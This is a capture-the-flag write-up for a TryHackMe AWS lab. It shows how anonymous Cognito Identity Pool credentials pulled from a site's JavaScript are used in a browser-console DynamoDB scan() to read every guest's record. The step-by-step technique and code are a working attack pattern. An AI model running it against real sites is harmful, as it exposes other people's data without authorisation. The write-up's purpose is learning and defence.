# Day 03
- **Challenge name:** [Complimentary](https://tryhackme.com/room/hh-complimentary-05e0b604)
- **Category:** Cloud Security / AWS Misconfiguration
- **Difficulty:** Easy/Medium
- **Date completed:** 29th of July 2026

## Summary
This challenge revolves around a small guest "wellness dashboard" website hosted on AWS S3. The app hands out temporary AWS credentials to anonymous visitors so they can pull their own guest record from a DynamoDB table straight from the browser — no login required. The task was to track down the mechanism issuing those credentials, use them to pull *more* than just my own record from the table, and retrieve another guest's flag.

## Exploitation / Walkthrough

### Step 1 - Finding the client-side AWS logic
I opened the site and went straight into Developer Tools (F12) → Sources. Inside `app.js` I found the app fetching data like this:

```js
AWS.config.credentials.get(function (err) {
  ...
  const dynamodb = new AWS.DynamoDB({ region: AWS_REGION });
  dynamodb.getItem(
    { TableName: TABLE_NAME, Key: { guest_id: { S: guestId() } } },
    function (err, data) { renderDashboard(data.Item); }
  );
});
```

This confirmed the app was using **AWS Cognito Identity Pools** to issue temporary, unauthenticated credentials directly to the browser, then querying DynamoDB client-side for a single record (`getItem`), scoped to the current guest's own `guest_id`.

### Step 2 - Extracting the Identity Pool config
Digging further through the Sources tab, I found the actual configuration values:

```js
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

Now I had the three key pieces of the puzzle: the Identity Pool ID, the region, and the target DynamoDB table name.

### Step 3 - Watching Cognito issue credentials (Network tab)
Switching to the **Network** tab and filtering for `cognito`, I reloaded the page and inspected the request to `cognito-identity.us-east-1.amazonaws.com`. Its `X-Amz-Target` header showed `AWSCognitoIdentityService.GetCredentialsForIdentity`. The **Response** body contained a full set of temporary AWS credentials:

```json
{
  "Credentials": {
    "AccessKeyId": "ASIA...",
    "SecretKey": "...",
    "SessionToken": "...",
    "Expiration": ...
  },
  "IdentityId": "us-east-1:..."
}
```

This confirmed the credential-issuing mechanism: any anonymous visitor gets a valid, temporary IAM identity just by loading the page.

### Step 4 - Scanning instead of getting
The critical insight: the app's own code *chose* to call `getItem` scoped to one guest, but nothing stopped the underlying IAM credentials from being used for a broader call - the restriction lived only in the frontend JavaScript logic, not in the actual permissions attached to the guest role.

Since the AWS SDK was already loaded and `AWS.config.credentials` was already populated by the page itself, I didn't even need to touch the AWS CLI. I opened the **Console** tab and ran:

```js
new AWS.DynamoDB({ region: 'us-east-1' }).scan(
  { TableName: 'complimentary-GuestWellnessProfiles' },
  (err, data) => console.log(err ? err.message : JSON.stringify(data, null, 2))
);
```

Instead of `getItem` (which fetches a single row by key), `scan` requests the *entire* table. The guest IAM role turned out to allow `dynamodb:Scan`, not just `dynamodb:GetItem` — a classic over-permissioned role misconfiguration.

### Step 5 - Retrieving the flag
The `scan()` call returned every guest record in the table, including profiles that didn't belong to me. Reading through the JSON output in the console, one of the other guest records contained the flag.

And voilà, there you have it!

## Flag
![redacted](https://img.shields.io/badge/-REDACTED-000000) <!-- TODO: paste the actual flag once ready to publish -->

## Lessons Learned
General takeaway for similar challenges: whenever a web app hands out AWS credentials (or any API tokens) to the browser to talk directly to a backend service, check what the *token itself* is actually authorized to do - not just what the app's UI/JS chooses to request. The gap between "what the frontend asks for" and "what the credentials allow" is exactly where these vulnerabilities live.
